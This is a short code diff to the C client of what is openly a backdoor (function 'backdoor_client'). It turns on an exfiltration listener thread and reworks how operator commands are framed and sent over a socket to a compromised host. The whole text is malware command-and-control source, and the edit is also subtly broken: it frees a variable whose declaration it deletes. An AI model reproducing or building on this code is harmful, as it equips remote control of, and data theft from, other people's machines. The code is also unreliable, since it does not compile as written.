@@ -43,41 +43,21 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	}
 
 	// exfil thread
-	//pthread_create(&exfil_thread, NULL, exfil_listen, &saddr);
-
+	pthread_create(&exfil_thread, NULL, exfil_listen, &ipaddr);
+	
 	printf("Ready, awaiting your command...\n");
 	while(fgets(command, MAX_LEN, stdin) != NULL)
 	{
-		char buff[MAX_LEN];
-		char *ptr = buff;
-		char *enc;
-		int len;
-		int hdr_len;
+		char *frame;
+		int length;
 
-		hdr_len = strlen(HDR_KEY);
-	
-		memcpy(ptr, HDR_KEY, hdr_len);
-		ptr += hdr_len;
-		memcpy(ptr, CMD_STR, strlen(CMD_STR));
-		ptr += strlen(CMD_STR);
-		memcpy(ptr, command, strlen(command));
-		ptr += strlen(command);
-		memcpy(ptr, CMD_END, strlen(CMD_END));
-		ptr += strlen(CMD_END);
-		
-		len = strlen(buff);
-
-		ptr = buff + hdr_len;
-		
-		enc = encrypt(PASSKEY, ptr, len - hdr_len);
-
-		memcpy(ptr, enc, len - hdr_len);
-	
-		sendto(sock, buff, len, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+		length = strlen(command) + 1;
 
 		free(enc);
 
-		printf("ABCAS\n");
+		frame = buildTransmission(command, &length, CMD_TYP);
+		sendto(sock, frame, length, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+		free(frame);
 	}	
 
 	// Listen thread cleanup
@@ -87,7 +67,7 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 		pthread_join(list_thread, NULL);
 	}
 
-	//pthread_join(exfil_thread, NULL);
+	pthread_join(exfil_thread, NULL);
 }
 
 void *listen_thread(void *arg)
